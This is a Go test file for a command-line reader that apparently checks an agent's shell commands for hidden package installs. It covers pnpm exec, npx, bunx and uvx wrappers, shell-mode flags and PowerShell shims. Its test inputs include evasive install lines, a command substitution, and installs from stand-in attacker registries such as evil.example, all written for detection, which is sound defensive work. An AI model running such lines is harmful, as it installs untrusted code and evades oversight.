package installread

import (
	"slices"
	"strings"
	"testing"
)

// ADR-0159 round 43, review of rounds 40-41 (review-1117/reader4041/review.md).
//
// P2-1: the program a package runner starts is read with its words as a nested command, as env's and sudo's are: pnpm
// exec, yarn exec, npm exec / npx, pnpm dlx / pnpx, bun x, uvx, uv run, pipx run. `pnpm exec sh -c '…'` ran its script
// through sh in pnpm 10.34.9, 11.28.12 and 12.21.0 (review probe4.out x1, x2; work-1116/reader-runner-shell/probe).
func TestReaderRunnerStartsProgram(t *testing.T) {
	for line, want := range map[string]string{
		"pnpm exec sh -c 'npm i zz-evil'":                                 "npm:zz-evil",
		"pnpm exec -- sh -c 'npm i zz-evil'":                              "npm:zz-evil",
		"pnpm exec bash -lc 'npm i zz-evil'":                              "npm:zz-evil",
		"pnpm exec eval 'npm i zz-evil'":                                  "npm:zz-evil",
		"pnpm exec npx zz-evil":                                           "npm:zz-evil",
		"pnpm exec npx -y zz-evil":                                        "npm:zz-evil",
		"pnpm exec env A=1 npx zz-evil":                                   "npm:zz-evil",
		"pnpm --dir web exec sh -c 'npm i zz-evil'":                       "npm:zz-evil",
		"pn exec sh -c 'npm i zz-evil'":                                   "npm:zz-evil",
		"yarn exec sh -c 'npm i zz-evil'":                                 "npm:zz-evil",
		"yarn exec npx zz-evil":                                           "npm:zz-evil",
		"npm exec -- sh -c 'npm i zz-evil'":                               "npm:zz-evil",
		"npx sh -c 'npm i zz-evil'":                                       "npm:zz-evil",
		"npx -p zz-a sh -c 'npm i zz-evil'":                               "npm:zz-evil",
		"pnpm --package=zz-a dlx sh -c 'npm i zz-evil'":                   "npm:zz-evil",
		"pnpx --package=zz-a sh -c 'npm i zz-evil'":                       "npm:zz-evil",
		"bun x sh -c 'npm i zz-evil'":                                     "npm:zz-evil",
		"bunx sh -c 'npm i zz-evil'":                                      "npm:zz-evil",
		"uvx --from zz-a sh -c 'pip install zz-evil'":                     "pypi:zz-evil",
		"uv run sh -c 'pip install zz-evil'":                              "pypi:zz-evil",
		"uv run -- pip install zz-evil":                                   "pypi:zz-evil",
		"pnpm exec 'npm i zz-evil'":                                       "npm:zz-evil", // a quoted program is one word; under shellMode it is a script
		"pnpm exec sudo npm i zz-evil":                                    "npm:zz-evil",
		"npm x -- sh -c 'npm i zz-evil'":                                  "npm:zz-evil",
		"uv tool run --from zz-a sh -c 'pip install zz-evil'":             "pypi:zz-evil",
		"npm exec --loglevel warn sh -c 'npm i zz-evil'":                  "npm:zz-evil",
		"pnpm --package=zz-a dlx --reporter silent sh -c 'npm i zz-evil'": "npm:zz-evil",
		"bunx --cwd /x sh -c 'npm i zz-evil'":                             "npm:zz-evil",
		"uv run python -m pip install zz-evil":                            "pypi:zz-evil",
		"pnpm exec /bin/sh -c 'npm i zz-evil'":                            "npm:zz-evil",
		"npx --package=zz-a sh -c 'npm i zz-evil'":                        "npm:zz-evil",
	} {
		if tg, _ := codesOn(line); !slices.Contains(tg, want) {
			t.Errorf("%q: targets %v, want %s", line, tg, want)
		}
	}
	// what the started shell runs is judged as it is at the top: a substitution, a pipe into a shell, a shell string
	for line, code := range map[string]string{
		"pnpm exec sh -c 'npm i $(cat p)'":                      "command_substitution",
		"pnpm exec sh -c 'npx -c x'":                            "command_string",
		"yarn exec sh -c 'npm i x --registry http://e.example'": "custom_registry",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, code) {
			t.Errorf("%q: codes %v, want %s", line, codes, code)
		}
	}
	// the hook's commands name the started program too (the agent reads its manager words)
	for line, want := range map[string]string{
		"pnpm exec npm i zz-evil":         "npm",
		"pnpm exec sh -c 'npm i zz-evil'": "npm",
		"npx -p zz-a pip install zz-evil": "pip",
	} {
		var progs []string
		for _, c := range Commands(line) {
			progs = append(progs, c.Prog)
		}
		if !slices.Contains(progs, want) {
			t.Errorf("%q: commands %v, want %s among them", line, progs, want)
		}
	}
	// lines that start no program alalanet reads stay as they were
	for line, want := range map[string][]string{
		"npx -y create-vite my-app --template react": {"npm:create-vite"},
		"pnpm dlx zz-pkg":                {"npm:zz-pkg"},
		"pnpm exec tsc --noEmit":         nil,
		"pnpm exec vitest run":           nil,
		"npx -y zz-pkg -c x":             {"npm:zz-pkg"},
		"yarn dlx zz-pkg --help":         {"npm:zz-pkg"},
		"uvx ruff check .":               {"pypi:ruff"},
		"uv run pytest -q":               nil,
		"npm exec -- prettier --write .": {"npm:prettier"},
		// a program alalanet does not read: an export run by pnpm exec does not reach the shell's npm
		"pnpm exec export NPM_CONFIG_REGISTRY=http://evil.example; npm i zz-pkg": {"npm:zz-pkg"},
	} {
		if tg, codes := codesOn(line); !slices.Equal(tg, want) || len(codes) > 0 {
			t.Errorf("%q: targets %v codes %v, want %v and no reason", line, tg, codes, want)
		}
	}
}

// P2-2: pnpm's value options after dlx or exec and on pnpx take their value; the package is the word after it. pnpm
// dlx --color always file:… ran the package in 10.34.9 and 11.28.12 (review probe4.out x4, x5).
func TestReaderPnpmValueOptions(t *testing.T) {
	for line, want := range map[string][]string{
		"pnpm dlx --color always zz-evil":             {"npm:zz-evil"},
		"pnpx --color always zz-evil":                 {"npm:zz-evil"},
		"pnx --color always zz-evil":                  {"npm:zz-evil"},
		"pnpm dlx --use-node-version 22.17.0 zz-evil": {"npm:zz-evil"},
		"pnpm dlx --workspace-concurrency 2 zz-evil":  {"npm:zz-evil"},
		"pnpm dlx --prefix /x zz-evil":                {"npm:zz-evil"},
		"pnpm add --color always zz-evil":             {"npm:zz-evil"},
		"pnpm --color always dlx zz-evil":             {"npm:zz-evil"},
		"pnpm dlx --color=always zz-evil":             {"npm:zz-evil"},
	} {
		if tg, _ := codesOn(line); !slices.Equal(tg, want) {
			t.Errorf("%q: targets %v, want %v", line, tg, want)
		}
	}
	for _, opt := range []string{"--color", "--use-node-version", "--workspace-concurrency", "--resume-from", "--prefix"} {
		if !pnpmTakesNext(opt) {
			t.Errorf("pnpmTakesNext(%q) = false", opt)
		}
	}
}

// P3-2: shell-mode spellings pnpm reads that round 40 missed — --config.shell-mode[=v], --config.shellMode, pnpm 11's
// --config.shell-mod; pnpm 11's and 12's `with <version>` before the command; value options before -c after dlx/exec.
// Each ran 'probe X;probe Y' through a shell in at least one of 8.15.9-12.21.0 (review probe.out … probe4.out).
func TestReaderPnpmShellModeMore(t *testing.T) {
	for _, line := range []string{
		"pnpm --config.shell-mode=true exec 'a;b'",
		"pnpm --config.shell-mode exec 'a;b'",
		"pnpm --config.shell-mode true exec 'a;b'",
		"pnpm --config.shellMode=true exec 'a;b'",
		"pnpm ---config.shell-mode=true exec 'a;b'",
		"pnpm -C . --config.shell-mode=true exec 'a;b'",
		"pnpm --config.shell-mod=true exec 'a;b'",
		"pnpm --config.shell-mode=true --package=zz dlx 'a;b'",
		"pnpm dlx --config.shell-mode=true --package=zz 'a;b'",
		"pnpx --config.shell-mode=true --package=zz 'a;b'",
		"pnpm dlx --package=zz --config.shell-mode=true 'a;b'",
		"pn --config.shell-mode=true exec 'a;b'",
		"pnpm with current -c exec 'a;b'",
		"pnpm with current --shell-mode exec 'a;b'",
		"pnpm -c with current exec 'a;b'",
		"pnpm --dir . with current -c exec 'a;b'",
		"pnpm with current -c --package=zz dlx 'a;b'",
		"pnpm with current dlx --package=zz -c 'a;b'",
		"pnpm with current exec -c 'a;b'",
		"pnpm with 11.28.12 -c exec 'a;b'",
		"pn with current -c exec 'a;b'",
		"pnpm dlx --color always -c --package=zz 'a;b'",
		"pnpx --color always -c zz",
		"pnpm dlx --prefix /x -c zz",
		"pnpm dlx --use-node-version 22.17.0 -c zz",
		"pnpm dlx --workspace-concurrency 2 -c zz",
		"pnpm exec --workspace-concurrency 2 -c 'a;b'",
		"pnpm exec --resume-from proj -c 'a;b'",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, "command_string") {
			t.Errorf("%q: codes %v, want command_string", line, codes)
		}
	}
	for _, line := range []string{
		"pnpm --config.shell-mode=false exec 'a;b'",
		"pnpm --config.shellMode=false exec 'a;b'",
		"pnpm --config.shell=true exec zzbin",
		"pnpm --config.registry=https://registry.npmjs.org/ exec zzbin",
		"pnpm with current exec zzbin",
		"pnpm with -c", // with takes a version: nothing is left to run
	} {
		if _, codes := codesOn(line); slices.Contains(codes, "command_string") {
			t.Errorf("%q: codes %v, want no command_string", line, codes)
		}
	}
	for x, want := range map[string]bool{
		"--config.shell-mode": true, "--config.shellMode": true, "--config.shell-mod": true, "--config.shellm": true,
		"--config.shell-mode=1": true, "--config.SHELL-MODE": true, "--config.shell-mode=false": false, "--config.shell": false,
		"--config.shel": false, "--config.shell-modes": false, "--config.": false, "--config.registry=x": false,
	} {
		if got := pnpmShellWord(x); got != want {
			t.Errorf("pnpmShellWord(%q) = %v, want %v", x, got, want)
		}
	}
}

// P3-2 too: pnpm 11's and 12's `with <version>` is read away before the command, so the command's targets are read.
func TestReaderPnpmWith(t *testing.T) {
	for line, want := range map[string][]string{
		"pnpm with current add zz-pkg":           {"npm:zz-pkg"},
		"pnpm with 11.28.12 dlx zz-pkg":          {"npm:zz-pkg"},
		"pn with current add zz-pkg":             {"npm:zz-pkg"},
		"pnpm --dir web with current add zz-pkg": {"npm:zz-pkg"},
		"pnpm with current":                      nil,
		"pnpm add with":                          {"npm:with"},
	} {
		if tg, _ := codesOn(line); !slices.Equal(tg, want) {
			t.Errorf("%q: targets %v, want %v", line, tg, want)
		}
	}
	for in, want := range map[string]string{"with current add x": "add x", "-C d with v exec y": "-C d exec y", "with": "with", "add with x": "add with x"} {
		_, got := canonCommand("pnpm", strings.Fields(in))
		if strings.Join(got, " ") != want {
			t.Errorf("canonCommand(pnpm %s) = %v, want %s", in, got, want)
		}
	}
}

// P3-4: a .ps1 shim (npm's cmd-shim writes one beside each .cmd, and PowerShell runs it when named) and a .bat are the
// program they wrap.
func TestReaderPs1Shims(t *testing.T) {
	for line, want := range map[string]string{
		"npx.ps1 -y zz-pkg":   "npm:zz-pkg",
		"pnpm.ps1 add zz-pkg": "npm:zz-pkg",
		"pn.ps1 add zz-pkg":   "npm:zz-pkg",
		"PNX.PS1 zz-pkg":      "npm:zz-pkg",
		`C:\Users\me\AppData\Roaming\npm\npx.ps1 zz-pkg`: "npm:zz-pkg",
		"npm.bat i zz-pkg": "npm:zz-pkg",
	} {
		if tg, _ := codesOn(line); !slices.Contains(tg, want) {
			t.Errorf("%q: targets %v, want %s", line, tg, want)
		}
	}
	for in, want := range map[string]string{"npx.ps1": "npx", `C:\x\PN.PS1`: "pn", "a.bat": "a", "x.ps1x": "x.ps1x"} {
		if got := launchBase(in); got != want {
			t.Errorf("launchBase(%q) = %q, want %q", in, got, want)
		}
	}
}
